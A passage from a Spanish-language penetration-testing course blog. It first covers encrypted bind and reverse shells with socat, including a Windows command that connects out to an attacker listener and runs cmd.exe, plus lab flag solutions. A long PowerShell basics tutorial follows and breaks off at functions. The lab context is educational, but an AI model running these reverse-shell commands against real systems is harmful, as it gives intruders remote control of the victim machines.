En primer lugar preparamos un certificado y llevamos tanto la llave privada como el certificiado sobre un fichero .pem y lo transportamos a la máquina Windows tal y como hemos hecho en el ejercicio anterior:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207205235.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, en la máquina kali preparamos un listener para recibir una conexión  cifrada:

```bash
socat -d -d OPENSSL-LISTEN:<PORT>,cert=rev-shell.pem,verify=0 STDOUT
```

Y desde Windows iniciamos una conexión con Socat utilizando el certificado y la clave transferidas antes:

```cmd
socat -d -d OPENSSL:<IP>:<PORT>,cert=rev-shell.pem,verify=0 EXEC:cmd.exe,pipes
```

<br />

**Encrypted Bind Shell**

Si intentamos poner en contacto la máquina Kali con Windows el firewall del segundo actuará bloqueando la solicitud. Por tanto, lo preferible siempre es intentar realizar una reverse shell ya que las conexiones salientes generalmente no se bloquean.

<br />

**1er Flag**

En este caso se nos da acceso a una máquina y nos pide que imaginemos que no queremos que nadie sea capaz de ver el tráfico que mandamos. Es decir, que generemos una conexión de administración remota cifrada con Socat.

De esta forma, en la información del ejercicio se nos dice que existe un puerto en el que Socat está escuchando, por la naturaleza del ejercicio asumismos que se trata de un servicio de Shell y nos conectamos con el siguiente comando:

```bash
socat openssl:192.168.150.52:32794,verify=0
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207231254.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2do Flag**

En este caso estamos en la misma situación que antes con la diferencia de que esta vez estamos ante una máquina Linux que tiene un firewall que bloquea un intento de efectuar una 'encrypted bind shell'. 

Por tanto, intentamos realizar una reverse shell. Preparamos un listener en nuestra kali con el comando después de haber preparado el correspondiente certificado y haber pasado la clave y certificado a un fichero .pem que Socat pueda leer:

```bash
socat -d -d - openssl-listen:4444,cert=rev-shell.pem,verify=0
```

Y en la máquina Linux víctima utilizamos la herramienta preparada para efectuar una conexión:

```bash
/usr/bin/encrypted-reverse-shell 192.168.119.150 4444
```

Y desde la nueva sesión abierta obtenemos la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221207233338.png' | relative_url }}" text-align="center"/>
</div>

<br />


### 4. PowerShell Scripting Basics.

Windows PowerShell es un lenguaje de automatización de tareas y administración de servicios que Windows presentó para ampliar la limitada funcionalidad de los ficheros [batch](https://en.wikipedia.org/wiki/Batch_file) los cuales son ficheros orientado a la creación de scripts de comandos de CMDs.

En este apéndice vamos a tener un mejor entendimiento de la fuerza de PowerShell, de sus posibles usos y de sus limitaciones.

<br />

##### 4.1. Introduction to PowerShell.

**Definición**

Técnicamente, Windows PowerShell se define como un [lenguaje de programación orientado a objetos](https://openwebinars.net/blog/que-es-la-programacion-orientada-objetos/#:~:text=Lenguajes%20de%20Programaci%C3%B3n%20Orientada%20a%20Objetos,-Para%20considerar%20un&text=Actualmente%20existen%20una%20gran%20variedad,%2C%20Smalltalk%2C%20PHP%20o%20Python.) (tal y como lo es Java por ejemplo) basado en el [.NET Framework](https://en.wikipedia.org/wiki/.NET_Framework) (un framework de programación creado por Microsoft).

En contraste con Bash que se trata de un lenguaje orientado a lectura y escritura de ficheros, PowerShell trabaja con objetos .NET que son instancias de clases que tienen métodos y atributos. De esta forma, la acción del código está basada sobre objetos, la acción de estos objetos es la que produce la acción del código de una manera mucha más conceptual dejando atrás la programación procedural.

<br />

**Desplegar una shell de PowerShell**

La forma que más interesa a un pentester de desplegar una shell de powershell es a través de una CMD (más adelante veremos de que PowerShell tiene su propio IDE que puede ser más interesante para un administrador o a un programador, pero rara vez un pentester tendrá acceso de forma inicial a un IDE). 

Una vez tenemos acceso a un entorno de ejecución de comandos en una máquina Windows 7 os superior podemos hacer uso del comando 'powershell' para o bien entrar en un entorno de powershell o ejecutar un comando de powershell con 'powershell -c':

```powershell
C:\Users\offsec>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform Powershell http://aka.ms/pscore6

PS C:\Users\offsec>Get-Service

Status   Name               DisplayName
------   ----               -----------
Stopped  AarSvc_49d30       Agent Activation Runtime_49d30
Stopped  AJRouter           Servicio de enrutador de AllJoyn
Stopped  ALG                Servicio de puerta de enlace de niv...
Stopped  AppIDSvc           Identidad de aplicación
Running  Appinfo            Información de la aplicación
Stopped  AppReadiness       Preparación de aplicaciones
Running  AppXSvc            Servicio de implementación de AppX ...
Running  AudioEndpointBu... Compilador de extremo de audio de W...
Running  Audiosrv           Audio de Windows
Stopped  autotimesvc        Hora de la red de telefonía móvil
Stopped  AxInstSV           Instalador de ActiveX (AxInstSV)
Stopped  BcastDVRUserSer... Servicio de usuario de difusión y G...
Stopped  BDESVC             Servicio Cifrado de unidad BitLocker
Running  BFE                Motor de filtrado de base
Stopped  BITS               Servicio de transferencia inteligen...
Stopped  BluetoothUserSe... Servicio de soporte técnico de usua...
Running  BrokerInfrastru... Servicio de infraestructura de tare...
Stopped  Browser            Examinador de equipos
Running  BTAGService        Servicio de puerta de enlace de aud...
Running  BthAvctpSvc        Servicio AVCTP
Running  bthserv            Servicio de compatibilidad con Blue...
Running  camsvc             Servicio Administrador de funcional...
Running  CaptureService_... CaptureService_49d30
...
```

<br />

```powershell
C:\Users\offsec>powershell -c Get-Service

Status   Name               DisplayName
------   ----               -----------
Stopped  AarSvc_49d30       Agent Activation Runtime_49d30
Stopped  AJRouter           Servicio de enrutador de AllJoyn
Stopped  ALG                Servicio de puerta de enlace de niv...
Stopped  AppIDSvc           Identidad de aplicación
Running  Appinfo            Información de la aplicación
Stopped  AppReadiness       Preparación de aplicaciones
Running  AppXSvc            Servicio de implementación de AppX ...
Running  AudioEndpointBu... Compilador de extremo de audio de W...
Running  Audiosrv           Audio de Windows
Stopped  autotimesvc        Hora de la red de telefonía móvil
Stopped  AxInstSV           Instalador de ActiveX (AxInstSV)
Stopped  BcastDVRUserSer... Servicio de usuario de difusión y G...
Stopped  BDESVC             Servicio Cifrado de unidad BitLocker
Running  BFE                Motor de filtrado de base
Stopped  BITS               Servicio de transferencia inteligen...
Stopped  BluetoothUserSe... Servicio de soporte técnico de usua...
Running  BrokerInfrastru... Servicio de infraestructura de tare...
Stopped  Browser            Examinador de equipos
Running  BTAGService        Servicio de puerta de enlace de aud...
Running  BthAvctpSvc        Servicio AVCTP
Running  bthserv            Servicio de compatibilidad con Blue...
Running  camsvc             Servicio Administrador de funcional...
Running  CaptureService_... CaptureService_49d30
...
```

Para concer la versión de powershell que estamos utilizando podemos desplegar los contenidos de la variable ''$PSVersionTable':

```powershell
PS C:\Users\offsec> $PSVersionTable
Name                           Value
----                           -----
PSVersion                      5.1.19041.1320
...
```

Por otra parte, si tenemos acceso a un entorno GUI (Interfaz Gráfica) podemos tener acceso al IDE de PowerShell. IDE atiende a (Integrated Development Enviroment) y es un entorno de desarrollo del lenguaje de un lenguaje de programación específico. Podemos acceder escribiendo 'PowerShell' sobre la barra de búsqueda y seleccionando la opción Windows PowerShell ISE:


<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208184106.png' | relative_url }}" text-align="center"/>
</div>

Esto nos dara acceso a una interfaz en la que existe una consola de comandos además de otras características especificas del IDE:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221208184224.png' | relative_url }}" text-align="center"/>
</div>

Los ejercicios estarán resueltos en el IDE.

<br />

##### 4.2. CmdLets.

**Definición. Cmdlet vs Command.**

PowerShell está basado en un tipo particular de programas denominados como CmdLets. Estos son algo así como los comandos de PowerShell, en el sentido de que son nombres que tienen asociado una funcionalidad dentro del lenguaje. Sin embargo, no pueden ser denominados 'comandos' como tal porque no lo son.

Esencialmente, un comando es un programa que ha sido compilado y que puede ejecutarse de forma independiente, en sí mismo (o si acaso, con la dependencia de algunas librerías pero que podrían estar incluidas en el propio código del comando). Por ejemplo, los comandos de Bash son programas autocontenidos que trabajan sobre ficheros.

Un CmdLet técnicamente es una clase de objeto del marco .NET que trabaja sobre otros objetos. Esto implica por otra parte que un CmdLet está pensado para formar parte siempre de un proceso modular (invocando métodos de objetos y concatenando varios CmdLets) y por tanto, como programa, es más liviano que un comando convencional, en el sentido de que como no está pensado para ejecutarse y ofrecer un resultado en sí mismo no tiene asociado un manejo de errores otras funcionalidades que si se requieren dentro de un comando.

<br />

**Ejemplos y cmdlets comúnes**

La estructura de los CmdLets es siempre la combinación de un verbo y un nombre separados por un guión. Por ejemplo: 'Get-Help', 'Set-ADAccount', etc. Estos nombres hacen que la funcionalidad del cmdlet sea más intuitiva.

Podemos obtener una lista de verbos con el cmdlet *Get-Verb*:

```powershell
PS C:\WINDOWS\system32> Get-Verb

Verb        Group
----        -----
Add         Common
Clear       Common
...
Trace       Diagnostic
Connect     Communications
Disconnect  Communications
Read        Communications
Receive     Communications
Send        Communications
Write       Communications
Block       Security
Grant       Security
Protect     Security
...
```

Otro de los cmdlets más útiles sería Get-Help, este, como el propio nombre indica, despliega ayuda sobre otros cmdlets o elementos de PowerShell:

```powershell
PS C:\WINDOWS\system32> Get-Help Get-Help

NAME
    Get-Help

SYNOPSIS
    Displays information about PowerShell commands and concepts.
    
SYNTAX
...
DESCRIPTION
...
```

Es importante mantener la ayuda actualizada con Update-Help como administrador, es especialmente importante de cara a la Importanción de Modulos de powershell para tener accesible ayuda sobre nuevos cmdlets.

<br />

**Parámetros**

Los parámetros son términos que siguien a un guión y que expanden la funcionalidad de un cmdlet. Fijándonos en la ayuda de Get-Help podemos ver un parámetro:

```powershell
...
SYNTAX
    Get-Help [[-Name] <System.String>]
...
```

De esta forma, también podríamos invocar al comando a través de:

```
PS C:\WINDOWS\system32> Get-Help -Name "Get-Help"

NAME
    Get-Help
...
```

Cualquier parámetro de PowerShell viene precedido por un guión (-) y está compuesto por un nombre y un valor asociado que algunas veces hay que especificar y otras veces no. Como hemos visto en el ejemplo anterior, -Name sería el nombre del parámtero y Get-Help sería el valor asociado entre comillas indicando que se trata de un String.

En el acaso de la ayuda, a través de parámetros podemos pedir una información más detallada del comando o bien pedir ejemplo:

```
...
SYNTAX
    Get-Help [[-Name] <System.String>] [-Category {Alias | Cmdlet | Provider | General | FAQ | Glossary | HelpFile | ScriptCommand | Function | Filter | ExternalScript | All | DefaultHelp | DscResource | Class | Configuration}] [-Component <System.String[]>] -DETAILED [-Functionality <System.String[]>] [-Path <System.String>] [-Role <System.String[]>] [<CommonParameters>]
    Get-Help [[-Name] <System.String>] [-Category {Alias | Cmdlet | Provider | General | FAQ | Glossary | HelpFile | ScriptCommand | Function | Filter | ExternalScript | All | DefaultHelp | DscResource | Class | Configuration}] [-Component <System.String[]>] -EXAMPLES [-Functionality <System.String[]>] [-Path <System.String>] [-Role <System.String[]>] [<CommonParameters>]
...
```

<br />

```
PS C:\WINDOWS\system32> Get-Help -Name "Get-Help" -Examples

NAME
    Get-Help
    
SYNOPSIS
    Displays information about PowerShell commands and concepts.
    
    --- Example 1: Display basic help information about a cmdlet ---
...
```

<br />

```
PS C:\WINDOWS\system32> Get-Help -Name "Get-Help" -Detailed

NAME
    Get-Help

...    
PARAMETERS
...
   -Detailed <Sytem.Management.Automatic.SwitchParameter>
       Adds parameter descriptions and examples to the basic help display...
```

<br />

**Alias**

Como sabemos de Bash en el apartado anterior, un alias es un nombre que sirve como shortcut para un comando de nombre más amplio. Así, 'help' es un alias de 'Get-Help':

```powershell
PS C:\WINDOWS\system32> help Get-Help

NAME
    Get-Help

SYNOPSIS
    Displays information about PowerShell commands and concepts.
...
```

Podemos tener una lista de alias mediante y además especificar si un determinado término está asociado a un comando:

```
PS C:\WINDOWS\system32> Get-Alias -Definition "help"

CommandType    Name                Version    Source
___________    ____                _______    ______
Alias          man -> help
...
```

Y podemos setear Alias con:

```
PS C:\WINDOWS\system32> Set-Alias -Name gh -Value Get-Help

PS C:\WINDOWS\system32> Get-Alias -Name gh

CommandType    Name                Version    Source
___________    ____                _______    ______
Alias          gh -> Get-Help
...
```

<br />

**Ejercicios**

¿Qué cmdlet nos presenta información detallada sobre los comandos de PowerShell?: Get-Help.

¿Cuántos alias existen para el cmdlet Get-ChildItem?: Get-Alias -Definition Get-ChildItem

¿Cuántos cmdlets hay con el verbo "Save"?: Get-Command -Verb Save

¿Qué parámetro de Get-Verb no está disponible en PowerShell 5.1. pero sí en versiones anteriores?: Group

¿Cuál es el título del décimo ejemplo de Get-Command?: Get-Help -Examples Get-Command y bajar hasta el décimo ejemplo > Get an alias.

<br />

##### 4.3. Variables.

**Definición de Variable.**

Una variable es un contenedor que almacena datos. En PowerShell se utiliza el operador '=' para declarar y asignar un valor a una variable al mismo tiempo:

```powershell
PS C:\WINDOWS\system32> $myString = "ABC123!@#"
PS C:\WINDOWS\system32> $myString
ABC123!@#
```

Toda variable debe empezar por '$'.

<br />

**Data Types**

Los datos se distinguen por tipos en función del tipo de dato que sean (String, Int, Float, etc). Una forma de saber qué tipo de dato contiene una variable es utilizar el método ".GetType()" sobre dicha variable:

```powershell
PS C:\WINDOWS\system32> $myString.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     String                          System.Object

PS C:\WINDOWS\system32> $myInt = 1903

PS C:\WINDOWS\system32> $myInt
1903

PS C:\WINDOWS\system32> $myInt.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int32                           System.ValueType

PS C:\WINDOWS\system32> $a = 100.5

PS C:\WINDOWS\system32> $a.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Double                          System.ValueType

PS C:\WINDOWS\system32> $b = 5000000000

PS C:\WINDOWS\system32> $b.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int64                           System.ValueType

PS C:\WINDOWS\system32> $False.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Boolean   

PS C:\WINDOWS\system32> $True.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Boolean

PS C:\WINDOWS\system32> $array1="blue","black","yellow","white","orange"

PS C:\WINDOWS\system32> $array1.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Object[]                        System.Array
```

<br />

**Arrays**

Especialmente interesante es el último objeto. Este objeto es un tipo array que consiste en una colección de objetos. Como podemos ver es una variable que contiene diversos datos separados por comas. Cada uno de estos datos se identifican por un índice desde el 0 y son accesibles de la siguiente forma:

```powershell
PS C:\WINDOWS\system32> $array1[0]
blue

PS C:\WINDOWS\system32> $array1[3]
white
```

<br />

**Operaciones entre variables**

Las variables, al ser contenedores de datos, pueden ser utilizadas para operar de la misma forma que lo haríamos con los mismos datos. En este sentido podemos realizar operaciones matemáticas o concatenar cadenas de caracteres:

``` powershell
PS C:\WINDOWS\system32> $a = 123

PS C:\WINDOWS\system32> $b = 456

PS C:\WINDOWS\system32> $a + $b
579

PS C:\WINDOWS\system32> $b + $a
456123

PS C:\WINDOWS\system32> $String1="Hola"

PS C:\WINDOWS\system32> $String1="Adios"

PS C:\WINDOWS\system32> $String1 + $String2
HolaAdios

PS C:\WINDOWS\system32> $String1 + " " + $String2
Hola Adios
```

Pero sin ninguna duda, la operación más interesante que podemos hacer es el casting, que consiste en pasar datos de un tipo a otro tipo. 

Consideremos el siguiente ejemplo:

```powershell
PS C:\WINDOWS\system32> $b = "456"

PS C:\WINDOWS\system32> $a = 123
```

La variable anterior, 'b', aun siendo un número es de hecho un tipo 'String' tal y como podemos ver utilizando el método en cuestión:

```powershell
PS C:\WINDOWS\system32> $a.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int32                           System.ValueType

PS C:\WINDOWS\system32> $b.GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     String                          System.Object
```

Sin embargo, podemos realizar un casteo de esta variable como sigue:

```powershell
PS C:\WINDOWS\system32> ([int]$b).GetType()

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Int32                           System.ValueType
```

Podemos observar que \[int\]$b ya no es una cadena de caracteres sino un valor entero. Lo mismo es aplicable a otra serie de datos, para mas información se tiene el siguiente [link](https://www.aulafacil.com/cursos/programacion/en-c/casting-de-datos-l17890#:~:text=Los%20casting%20en%20programaci%C3%B3n%20se,sistema%20de%20conversi%C3%B3n%20como%20tal.)

<br />

**Variables conocidas**

Algunas variables que powershell contiene por defecto son:

-   **$Error** contiene una matriz de objetos de error.

-   **$Host** contiene información sobre la aplicación de alojamiento actual.

-   **$Profile** contiene la ruta al perfil de usuario actual para PowerShell.

-   **$PID** contiene el ID de proceso de la sesión actual de PowerShell.

-   **$PSUICulture** contiene la referencia cultural de la interfaz de usuario o el idioma regional de la interfaz de usuario.

-   **$NULL** contiene el valor de NULL.

-   **$False** contiene el valor de False.

-   **$True** contiene el valor de True.

<br />

**Ejercicios**

¿Cuál es el valor del _total_ en el siguiente bloque de código de PowerShell?

```
$x = "123.5"
$y = 456
$z = .25
$total = $x + $y + $z
```

Copiar el código en el ISE y ver el valor de la variable $total.

<br />

Si quisiéramos convertir la variable _x_ de cadena a doble para sumar los tres números, ¿qué sintaxis necesitaríamos agregar delante de _x_ en la última línea del programa?: \[double\]

<br />

¿Cuál es el resultado de la ecuación "fija" de la pregunta 2?:

Copiar el código 

```bash
[double]$x = "123.5"
$y = 456
$z = .25
$total = $x + $y + $z
```

Y mostrar el resultado de la variabl $total.

<br />

¿Cuál es el resultado de la última instrucción?

```
PS C:\WINDOWS\system32> $myArray=1,2,3,4,5

PS C:\WINDOWS\system32> $myArray[3]
```

<br />

##### 4.4. Operadores.

Un operador es un caracter que se utiliza dentro de una expresión para obtener un resultado a partir de uno o varios objetos. Distinguimos esencialmente entre:

- *Asignador*, '=': Se utiliza para asignar o manipular valores de variables.
- *Arithemtic*: Sirven para realizar operaciones matemáticas como '+' o '-'. Especial mencion merece el operador monádico incremento (++) o decremento (--) o el operador módulo (%).
- *Comparison*: Comparan objetos para ver si son iguales en algún aspecto, '-eq'.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221209124831.png' | relative_url }}" text-align="center"/>
</div>

- *Logical*: Operador usado para conectar dos o más expresiones '-and' y '-or'.

```powershell
PS C:\WINDOWS\system32> ($num1 -le 10) -and ($num2 -le 10)
True
```

<br />

```powershell
PS C:\WINDOWS\system32> ($num1 -lt 10) -or ($num2 -lt 10)
True
```

<br />

##### 4.5. Conditional Statements and Loops.

Hasta ahora hemos visto elementos básicos como variable y formas de interactuar y sacar conclusiones con esta variable. Ahora vamos a ver herramientas que nos van a ayudar a gestionar el control del flujo del código; estamos hablando de los bucles y las sentencias condicionales, que nos permitirán dirigir el curso del código en base a respuesta automatizadas.

<br />

**If/Else conditional statement**

El statement If/Else permite al código elaborar decisiones en base al valor booleano de una condición. Si este valor es verdadero se ejecutará un bloque de código y si es faldo se ejecutará el bloque de código perteneciente al término 'Else'. La sintaxis específica de este statement es como sigue:

```powershell
PS C:\WINDOWS\system32> if (<condition>)
{
  <code1>
}
else
{
 <code2>
}
```

Por ejemplo:

```powershell
PS C:\WINDOWS\system32> if(80 -ge 70)
{
  Write-Output "Passed"
}
else
{
  Write-Output "Failed"
}
Passed
```

<br />

**Switch**

Conceptualmente este statemente es una extensión del If/Else a más de dos casos. El statement *Switch* compara un valor dado con un conjunto de posibles casos comtemplados para el valor de dicho dato y en función de cada caso ejecuta un bloque de código.

```
PS C:\WINDOWS\system32> switch ($var)
{
  <case1>{<code>}
  <case2>{<code>}
  ...
}
OUTPUT
```

Un ejemplo sería:

```powershell
PS C:\WINDOWS\system32> $number1 = 4

PS C:\WINDOWS\system32> switch ($number1)
{
  1{Write-Output "Number is 1"}
  2{Write-Output "Number is 2"}
  3{Write-Output "Number is 3"}
  4{Write-Output "Number is 4"}
  5{Write-Output "Number is 5"}
}
Number is 4
```

<br />

**For and While Loops**

Los bucles for y while son un statements que nos permiten repetir un bloque de código hasta que se cumple una determinada condición.

Concretamente, el bucle for está orientado a repetir el bloque un número concreto de veces variando una o varias partes concretas del código en cada iteración. 

Por ejemplo:

```powershell
PS C:\WINDOWS\system32> for ($myVar=0; $myVar -lt 5; $myVar++)
{
  Write-Output $myVar;
}
0
1
2
3
4
```

El ejemplo anterior repite desde 0 hasta 4 escalando una cada vez un bloque de código mostrando que además, en cada iteración la variable $myVar cambia cada vez. El bucle termina cuando la condición que ocupa el puesto de 2º parámetro se cumple, es decir, cuando $myVar es igual o mayor que 5.

Una variación que tiene más flexibilidad y usos más prácticos del bucle for sería el 'foreach', que selecciona un objeto de un conjunto de objetos y realiza algo con él para todos los elementos del conjunto:

```powershell
PS C:\WINDOWS\system32> $myWord = "powershell"

PS C:\WINDOWS\system32> $myArray = $myWord.ToCharArray()

PS C:\WINDOWS\system32> foreach ($myLetter in $myArray)
{
  $myLetter
}
p
o
w
e
r
s
h
e
l
l
```

Para entender este ejemplo es conveniente saber que el método *.ToCharArray()* convierte un String (técnicamente cadena de caracteres) en un objeto array cuyas casillas son los caracteres que componen el string.

El bucle While, como comentábamos al principio sigue el mismo principio del bucle For, sin embargo está orientado a la repetición de un bucle de código hasta que se cumple una condición sin la necesidad de saber exactamente cuántas repeticiones de código serán. 

La sintaxis es:

```powershell
while (<condition>)
  {
	  <code>
  }
```

Por ejemplo:

```powershell
 $count = 0;
1  while ($count -lt 5)
2  {
3    if ($count -eq 1)
4    {
5      break;
6    }
7    $count;
8    $count++;
9  }
```



Observemos que el incremento de 'count' (al contrario de lo que ocurría en el bucle for) está especificado dentro del código pero su presencia  no es una condición necesaria y eso convertiría al bucle en un bucle sin fin.

Una forma más concreta del bucle while infinito es el siguiente:

```powershell
while ($True)
{
  <code>
}
```

Este tipo de bucle es muy útil en diversas situaciones y conviene tenerlo en mente.

A veces la condición puede ser una señal para parar el bucle:

```powershell
$words = "powershell","offensive","security","hacker","scripting","forensics","pentest"
foreach ($word in $words)
{
  if ($word -eq "hacker")
  {
    break
  }
  Write-Output $word
}
```


<br />

##### 4.6. PowerShell Propierties and Methods.

**Definición de propiedades y métodos.**

Como hemos comentado al principio, la funcionalidad de PowerShell reside en CmdLets que trabajan sobre objetos, instancias de clases. Asociados al manejo de las clases podemos encontrar las *Propiedades* y los *Métodos*. 

Una propiedad es una característica o atributo de una clase que toma un valor concreto en un objeto caracterizándolo. Por otra parte, un método es una acción de código asociada a dicho objeto.

<br />

**Accediendo a las propiedades y métodos de un objeto.**

Podemos acceder a ambos elementos mediante el CmdLet 'Get-Member' en conjunción con un operador 'pipe'. 

Como ejemplo, podemos designar una variable. Una variable es efectivamente una instancia de la clase Variable, un objeto, que tiene propiedades y métodos, veámoslos. Supongámos que tenemos la variable $Var = "Christina", entonces:

```
PS C:\WINDOWS\system32> $Var | Get-Member

    TypeName: Sytem.String

Name                MemberType      Definition
----                ----------      ----------
Clone               Method          System.Object Clone(), System.Object ICloneable.Clone()
... 
GetType             Method          type GetType()
...
ToCharArray         Method          char IConvertible.ToChar(System.IFormatProvider provider)
...
Length              Property        int Length {get;}
```


Aquí podemos observar unos pocos pero la realidad es que esta es una variable tipo String y tiene muchos métodos y propiedades disponibiles. 

Para usar un método o ver una propiedad sobre una acción siempre utilizamos un punto (.) después del nombre del objeto. Por ejemplo:

```powershell
PS C:\WINDOWS\system32> $Var
Christina

PS C:\WINDOWS\system32> $Var.ToLower()
christina

PS C:\WINDOWS\system32> $Var.Length
9
```

Observamos que ambos son funciones que se aplican sobre el objeto, ya sea para obtener una característica suya o para utilizar su contenido con algún propósito. La diferencia sintactica entre un método y una propiedad es que el método tiene paréntesis.

<br />

**Ejercicios**

¿Cuántos métodos tiene el cmdlet Get-ScheduledTask?

```powershell
Get-ScheduledTask | Get-Member -MemberType Method | Measure-Object -Line
```

9

<br />

En orden alfabético, lista las dos propiedades que contienen la palabra "Write" en el nombre del cmdlet Get-ChildItem.

```powershell
Get-ChildItem | Get-Member -MemberType Property -Name "*write*"
```

LastWriteTime, LastWriteTimeUtc

<br />

##### 4.7. Filtering and Fromatting. 

Antes hemos visto que PowerShell consta de objetos que tienen asociada una gran multitud de información asociada. Ahora vamos a aprender a cómo desplegar exactamente la información que necesitamos de una entidad concreta.

<br />

**Select-Object**

Select-Object es un CmdLet que nos permite seleccionar una propiedad de uno o más objetos. Continuando con los ejemplos anteriores:

```powershell
PS C:\WINDOWS\system32> $Var | Select-Object -Property Length

Length
------
9

PS C:\WINDOWS\system32> $Var.Length

9
```

Debemos saber que, aunque en principio el output esa igual, la forma en la trabajan ambos comandos es distinta y muchas veces no proporcionarán los mismos resultados. 

Otro ejemplo de uso sería con Get-Service. Get-Service es un CmdLet que lista los servicios instalados en el sistema Windows, es un cmdlet especialmente importante debido a que puede conducir a un pentester a potenciales vectores de ataque de distinta índole:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210135959.png' | relative_url }}" text-align="center"/>
</div>

Para listar servicios debemos ser administrador. Si cruzamos el display anterior con Get-Member obtendríamos el siguiente resultado:

```powershell
PS C:\WINDOWS\system32> Get-Service | Get-Member
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210140122.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que se despliegan múltiples métodos y propiedades asociados al objeto Get-Service en formato de tabla. Pero otra forma de obtener esta información es cruzando Get-Services y obteniendo sólo una serie de proppiedades deseadas:

```powershell
Get-Service | Select-Object -Property "DisplayName","MachineName","ServiceType","StartType","Status"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210140812.png' | relative_url }}" text-align="center"/>
</div>

Aquí podemos ver que se muestra en formato de Lista que es más manejablen y además sólo muestra la información pedida que es en esencia la que queremos saber.

<br />

**Sort-Object**

Sort-Object es un cmdlet que nos permite ordenar la información mostrada en base a una propiedad u objeto. Por ejemplo, supongámos que queremos mostrar los servicios en función de su status en orden descendente, esto es; running, stop, etc:

```powershell
PS C:\WINDOWS\system32> Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210142245.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Where-Object**

Where-Object nos permite filtrar por un parámetro que tiene un valor dado. Por ejemplo, supongámos que de los servicios listados anteriormente sólo nos interesan aquellos que que empiezan al ejecutarse la máquina o que empiezan 'automáticamente':

```powershell
PS C:\WINDOWS\system32> Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210143629.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Format-Table/List**

Format-Table o Format-List son comandos que formatean el output o bien en tabla o bien en forma de lista, por ejemplo:

```powershell
PS C:\WINDOWS\system32> Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table
```

Este comando, además de filtrar el nombre del servicio de acuerdo a una expresión regular para que sólo presente aquellos servicios que empiecen por 's' despliega el output en forma de Tabla, es decir, filas y columnas:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221210181440.png' | relative_url }}" text-align="center"/>
</div>

Existen más formatos aunque sólo estemos presentando estos dos.

<br />

**Get-PSProvider, Get/Set/New-Item, Get/Set/New-ItemProperty**

Los *providers* son contenedores del marco .NET que facilitan el acceso a ciertos tipos de datos. Podemos ver una lista del providers actuales ejecutando Get-PSProvider:

```powershell
PS C:\WINDOWS\system32> Get-PSProvider

Name          Capabilities                          Drives
----          ------------                          ------
Registry      ShouldProcess, Transactions           {HKLM, HKCU}
Alias         ShouldProcess                         {Alias}
Environment   ShouldProcess                         {Env}
FileSystem    Filter, ShouldProcess, Credentials    {C, A, D}
Function      ShouldProcess                         {Function}
Variable      ShouldProcess                         {Variable}
```

Podemos ver los objetos asociados a cada clase con Get-Item o directamente navegando al contenender con cd:

```powershell
PS C:\WINDOWS\system32> Get-Item alias:

CommandType     Name                             Version    Source
-----------     ----                             -------    ------
Alias           foreach -> ForEach-Objec
Alias           % -> ForEach-Objec
Alias           where -> Where-Objec
Alias           ? -> Where-Objec
Alias           ac -> Add-Content
Alias           clc -> Clear-Content
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           clv -> Clear-Variable
Alias           compare -> Compare-Objec
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoin
Alias           diff -> Compare-Objec
...

PS C:\WINDOWS\system32> cd Alias:; ls

CommandType     Name                             Version    Source
-----------     ----                             -------    ------
Alias           foreach -> ForEach-Objec
Alias           % -> ForEach-Objec
Alias           where -> Where-Objec
Alias           ? -> Where-Objec
Alias           ac -> Add-Content
Alias           clc -> Clear-Content
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           clv -> Clear-Variable
Alias           compare -> Compare-Objec
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoin
Alias           diff -> Compare-Objec
...
```

Y vemos todos los alias y a qué comando sustituyen. Así por ejemplo, 'ls', 'dir' son ambos alias de Get-ChildItem que lista los contenidos del directorio actual. Observemos que el propio directorio C es un provider.

<br />

##### 4.8. PowerShell Functions.

**Definición y creación de funciones**

Las funciones son piezas de código que podemos invocar. Están pensadas para reciclar bloques de código.

Para poder definir una función hay que escribilar la siguiente sintaxis:

```powershell
